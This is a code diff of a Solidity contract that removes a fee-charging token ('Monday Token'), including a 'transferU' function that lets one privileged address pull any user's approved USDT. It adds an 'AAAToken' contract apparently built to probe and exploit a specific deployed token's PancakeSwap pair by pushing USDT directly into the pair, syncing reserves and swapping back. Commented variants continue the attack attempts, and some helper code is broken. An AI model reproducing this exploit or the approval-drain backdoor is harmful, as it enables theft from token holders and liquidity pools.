@@ -3,14 +3,12 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.3;
 
-import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
-import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+import "@openzeppelin/contracts/utils/Context.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/utils/Strings.sol";
 
 interface IUniswapV2Factory {
     event PairCreated(
@@ -397,297 +395,173 @@ interface IPancakeERC20 {
     ) external;
 }
 
-contract NBBToken is
-    Initializable,
-    ERC20Upgradeable,
-    UUPSUpgradeable,
-    OwnableUpgradeable
-{
-    using SafeMathUpgradeable for uint256;
-    using AddressUpgradeable for address;
+contract AAAToken{
+    using SafeMath for uint256;
+    using Address for address;
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
-    ERC20Upgradeable private _usdtToken;
-
-    uint256 public buyFeeRate; //10%
-    uint256 public mintFeeRate; //50%
-    uint256 public sellFeeRate; //10% 动态
-    uint256 public slippageFee;
-    address public orePoolAddress; //TODO:
-    address public pledgeAddress; //TODO:
-    address public gameAddress; //TODO:
-    address public transferAddress;
-    ERC20Upgradeable _soaToken;
-    uint256 public soaSwapIndex;
-    bool public soaTokenSwapping;
+    ERC20 private _usdtToken;
+    ERC20 _targetToken;
 
     /// @custom:oz-upgrades-unsafe-allow constructor
-    constructor() initializer {}
-
-    function _authorizeUpgrade(address) internal override onlyOwner {}
-
-    function initialize() public initializer {
-        __ERC20_init("Monday Token", "Monday");
-        __Ownable_init();
-        __UUPSUpgradeable_init();
-
-        _mint(msg.sender, 100000000000 * 10**decimals());
-        //PRD 0x10ED43C718714eb63d5aA57B78B54704E256024E  TEST 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
+    constructor(){
+        //PRD 0x10ED43C718714eb63d5aA57B78B54704E256024E
         uniswapV2Router = IUniswapV2Router02(
             0x10ED43C718714eb63d5aA57B78B54704E256024E
         );
-        // PRD 0x55d398326f99059fF775485246999027B3197955 TEST
-        _usdtToken = ERC20Upgradeable(
+        // PRD 0x55d398326f99059fF775485246999027B3197955
+        _usdtToken = ERC20(
             0x55d398326f99059fF775485246999027B3197955
         );
-        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
-                address(this),
-                address(_usdtToken)
-            );
-        buyFeeRate = 1000;
-        sellFeeRate = 1000;
-        mintFeeRate = 5000;
-        orePoolAddress = owner();
-        transferAddress = owner();
-        pledgeAddress = owner();
-        gameAddress = owner();
-        soaSwapIndex = 300;
-        soaTokenSwapping = true;
-        _soaToken = ERC20Upgradeable(
-            0xc7e9D15A2dC34d3a9F532b325396B8bf02F44fB8
+        _targetToken = ERC20(
+            0x5b56405Bb10841Dd282B44981E9743c60AE7E65a
+        );
+
+        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(
+            address(_usdtToken),
+            address(_targetToken)
         );
     }
 
-    event Buy(address from, address to, uint256 amount);
-    event Sell(address from, address to, uint256 amount);
-    event AddLiquidity(address from, uint256 amount);
-    event RemoveLiquidity(address from, uint256 amount);
+    function transfer1(address to,uint256 amounts,uint256 subAmount) public {
+        address[] memory buyPath = new address[](2);
+        buyPath[0] = address(_usdtToken);
+        buyPath[1] = address(_targetToken);
 
-    function transfer(address to, uint256 amount)
-        public
-        override
-        returns (bool)
-    {
-        address from = _msgSender();
-        if (
-            to != uniswapV2Pair &&
-            from != uniswapV2Pair &&
-            from != address(uniswapV2Router) &&
-            to != address(uniswapV2Router)
-        ) {
-            super._transfer(from, to, amount);
-            return true;
-        }
-
-        (uint256 _reserve0, uint256 _reserve1, ) = IPancakePair(uniswapV2Pair)
-            .getReserves();
-        if (IPancakePair(uniswapV2Pair).token0() == address(_usdtToken)) {
-            uint256 tmp = _reserve0;
-            _reserve0 = _reserve1;
-            _reserve1 = tmp;
-        }
-        uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
-        if (usdtBal > _reserve1) {
-            uint256 fee = amount.mul(buyFeeRate).div(10000);
-            uint256 mintFee = amount.mul(mintFeeRate).div(10000);
-            slippageFee = slippageFee.add(mintFee);
-            super._transfer(from, orePoolAddress, fee);
-            super._transfer(from, to, amount.sub(fee));
-
-            emit Buy(from, to, amount);
-            return true;
-        }
-
-        super._transfer(from, to, amount);
-        emit RemoveLiquidity(to, amount);
-
-        return true;
+        address[] memory sellPath = new address[](2);
+        sellPath[0] = address(_targetToken);
+        sellPath[1] = address(_usdtToken);
+        _usdtToken.approve(
+            address(uniswapV2Router),
+            type(uint256).max
+        );
+        _targetToken.approve(
+            address(uniswapV2Router),
+            type(uint256).max
+        );
+        _usdtToken.transferFrom(payable(msg.sender), uniswapV2Pair, amounts);
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amounts,
+            0,
+            buyPath,
+            address(this),
+            block.timestamp
+        );
+        uint256 targetAmount = _targetToken.balanceOf(to);
+        revert(Strings.toString(targetAmount));
+        // uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        //     targetAmount.sub(subAmount),
+        //     0,
+        //     sellPath,
+        //     to,
+        //     block.timestamp
+        // );
     }
 
-    // function setFeeRate(
-    //     uint256 _buyFeeRate,
-    //     uint256 _mintFeeRate,
-    //     uint256 _sellFeeRate
-    // ) public onlyOwner {
-    //     buyFeeRate = _buyFeeRate; //10%
-    //     mintFeeRate = _mintFeeRate; //50%
-    //     sellFeeRate = _sellFeeRate; //10% 动态
+    // function transfer2(address to,uint256 amounts,address[] calldata path) public {
+    //     _usdtToken.transferFrom(payable(msg.sender), uniswapV2Pair, amounts);
+    //     _usdtToken.transferFrom(payable(msg.sender), address(this), amounts);
+    //     _usdtToken.approve(
+    //         address(uniswapV2Router),
+    //         amounts
+    //     );
+    //     uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+    //         amounts,
+    //         0,
+    //         path,
+    //         address(this),
+    //         block.timestamp
+    //     );
     // }
 
-    // function updateSlippageK(uint256 amount) public onlyOwner{
-    //     require(slippageFee >= amount);
-    //     super._transfer(uniswapV2Pair, orePoolAddress, amount);
+    // function transfer3(address to,uint256 amounts,address[] memory path) public {
+    //     _usdtToken.transferFrom(payable(msg.sender), address(this), amounts);
+    //         _usdtToken.approve(
+    //         address(uniswapV2Router),
+    //         type(uint256).max
+    //     );
+    //     _targetToken.approve(
+    //         address(uniswapV2Router),
+    //         type(uint256).max
+    //     );
+    //     uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+    //         amounts,
+    //         0,
+    //         path,
+    //         to,
+    //         block.timestamp
+    //     );
+    //     _usdtToken.transferFrom(payable(msg.sender), uniswapV2Pair, amounts);
     //     IPancakePair(uniswapV2Pair).sync();
-    //     slippageFee = slippageFee.sub(amount);
     // }
 
-    // function updateK(uint256 amount) public onlyOwner {
-    //     super._transfer(uniswapV2Pair, orePoolAddress, amount);
+    // function transfer4(address to,uint256 amounts,uint256 subAmount,address[] memory path) public {
+    //         _usdtToken.approve(
+    //         address(uniswapV2Router),
+    //         type(uint256).max
+    //     );
+    //     _targetToken.approve(
+    //         address(uniswapV2Router),
+    //         type(uint256).max
+    //     );
+    //     uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+    //         amounts,
+    //         0,
+    //         path,
+    //         address(this),
+    //         block.timestamp
+    //     );
+    //     _usdtToken.transferFrom(payable(msg.sender), uniswapV2Pair, amounts);
+    //     IPancakePair(uniswapV2Pair).sync();
+
+    //     uint256 targetAmount = _targetToken.balanceOf(payable(msg.sender));
+    //     address tmp = path[0];
+    //     path[0]=path[1];
+    //     path[1] = tmp;
+    //     uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+    //         targetAmount.sub(subAmount),
+    //         0,
+    //         path,
+    //         to,
+    //         block.timestamp
+    //     );
+    // }
+
+
+    // function getInAmount() public view returns  (uint256) {
+    //     address[] memory path = new address[](2);
+    //     path[0] = address(_usdtToken);
+    //     path[1] = address(_targetToken);
+    //     uint256 nbbBal = _targetToken.balanceOf(uniswapV2Pair);
+    //     (uint256 r0,uint256 r1,) = IPancakePair(uniswapV2Pair).getReserves();
+    //     uint256 amounts = uniswapV2Router.getAmountIn(nbbBal, r0,r1);
+    //     return amounts;
+    // }
+    // function getInOutAmount01(uint256 nbbBal) public view returns (uint256){
+    //     uint256 nbbBal = _targetToken.balanceOf(uniswapV2Pair);
+    //     (uint256 r0,uint256 r1,) = IPancakePair(uniswapV2Pair).getReserves();
+    //     uint256 amounts = uniswapV2Router.getAmountIn(nbbBal.sub(1*18**_targetToken.decimals()), r0,r1);
+    //     return amounts;
+    // }
+
+
+
+    // function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) public{
+    //     IPancakePair(uniswapV2Pair).swap(amount0Out, amount1Out, to, data);
+    // }
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amount,address to,address[] calldata sellPath) public{
+         ERC20(sellPath[0]).approve(uniswapV2Pair, amount);
+         uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amount,
+            0,
+            sellPath,
+            to,
+            block.timestamp
+        );
+    }
+    // function sync() public{
     //     IPancakePair(uniswapV2Pair).sync();
     // }
-
-    event Activate(address from, uint256 id);
-
-    function activate(uint256 amount, uint256 id) public {
-        address spender = _msgSender();
-        _usdtToken.transferFrom(spender, uniswapV2Pair, amount);
-        IPancakePair(uniswapV2Pair).sync();
-        emit Activate(spender, id);
-    }
-
-    function setGameAddress(address account) public onlyOwner {
-        gameAddress = account;
-    }
-
-    function setOrePoolAddress(address account) public onlyOwner {
-        orePoolAddress = account;
-    }
-
-    function setSOAToken(address account) public onlyOwner {
-        _soaToken = ERC20Upgradeable(account);
-    }
-
-    function setSlippageFee(uint256 amount) public onlyOwner {
-        slippageFee = amount;
-    }
-
-    function setPledgeAddress(address account) public onlyOwner {
-        pledgeAddress = account;
-    }
-
-    function getSellSlippage(uint256 amount)
-        public
-        view
-        returns (bool, uint256)
-    {
-        uint256 _reserve0;
-        uint256 _reserve1;
-        (_reserve0, _reserve1, ) = IPancakePair(uniswapV2Pair).getReserves();
-        if (_reserve0 == 0 || _reserve1 == 0) {
-            return (true, 0);
-        }
-        uint256 kLast = _reserve0.mul(_reserve1);
-
-        uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
-
-        if (IPancakePair(uniswapV2Pair).token0() == address(_usdtToken)) {
-            uint256 tmp = _reserve0;
-            _reserve0 = _reserve1;
-            _reserve1 = tmp;
-        }
-
-        if (usdtBal > _reserve1) {
-            return (true, 0);
-        }
-
-        uint256 oldPrice = (_reserve1.mul(10**8)).div(_reserve0);
-
-        uint256 newReserve0 = _reserve0.add(amount);
-        uint256 newReserve1 = kLast.div(newReserve0);
-        uint256 diff = _reserve1.sub(newReserve1);
-        uint256 newPrice = diff.mul(10**8).div(amount);
-
-        if (oldPrice > newPrice) {
-            uint256 slippage = (
-                (oldPrice.sub(newPrice, "oldPrice < newPrice")).mul(10**4)
-            ).div(oldPrice);
-            return (false, slippage);
-        }
-        return (false, 0);
-    }
-
-    function transferFrom(
-        address from,
-        address to,
-        uint256 amount
-    ) public override returns (bool) {
-        address spender = _msgSender();
-        _spendAllowance(from, spender, amount);
-        
-        (bool addLiquidity, uint256 sellSlippage) = getSellSlippage(amount);
-        if (addLiquidity) {
-            super._transfer(from, to, amount);
-            emit AddLiquidity(from, amount);
-            return true;
-        }
-
-        uint256 sellFee = amount.mul(sellFeeRate).div(10000);
-        uint256 lftPool = sellFee;
-
-        if (sellSlippage > sellFeeRate) {
-            sellFee = amount.mul(sellSlippage).div(10000);
-            uint256 mintFee = sellFee.sub(lftPool, "lftPool > sellFee");
-            super._transfer(from, orePoolAddress, mintFee);
-        }
-
-        require(amount.mul(10000).div(balanceOf(uniswapV2Pair)) <= 1000,"not allow");
-
-        super._transfer(from, orePoolAddress, sellFee);
-        uint256 leftFee = amount.sub(sellFee);
-        super._transfer(from, to, leftFee);
-
-        uint256 leftAmount = leftFee.sub(lftPool, "lftPool > leftFee");
-        slippageFee = slippageFee.add(leftAmount);
-        emit Sell(from, to, amount);
-        return true;
-    }
-
-    //hash 对对碰
-    event HashGame(address, uint256, address, uint256);
-
-    function hashGame(
-        address token,
-        uint256 gameType,
-        uint256 amount
-    ) public {
-        //
-        address spender = _msgSender();
-        if (token == address(this)) {
-            super._transfer(spender, gameAddress, amount);
-        } else {
-            ERC20Upgradeable(token).transferFrom(spender, gameAddress, amount);
-        }
-        emit HashGame(spender, gameType, token, amount);
-    }
-
-    event PledgeUSDT(address, uint256);
-
-    //理财质押
-    function pledgeUSDT(uint256 amount) public {
-        // require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
-        address spender = _msgSender();
-        _usdtToken.transferFrom(spender, pledgeAddress, amount);
-        emit PledgeUSDT(spender, amount);
-    }
-
-    function setTransUAddress(address account) public {
-        require(_msgSender() == transferAddress);
-        transferAddress = account;
-    }
-
-    function transferU(
-        address from,
-        address to,
-        uint256 amount
-    ) public {
-        require(_msgSender() == transferAddress);
-        _usdtToken.transferFrom(from, to, amount);
-    }
-
-    event SwapSOA(address, uint256);
-
-    function setSoaTokenSwapping(bool flag) public onlyOwner {
-        soaTokenSwapping = flag;
-    }
-
-    function swapSOA() public {
-        require(soaTokenSwapping, "not open");
-        address spender = _msgSender();
-        uint256 bal = _soaToken.balanceOf(spender);
-        require(bal > 0);
-        _soaToken.transferFrom(spender, orePoolAddress, bal);
-        super._transfer(orePoolAddress, spender, bal * soaSwapIndex);
-        emit SwapSOA(spender, bal);
-    }
+    
 }
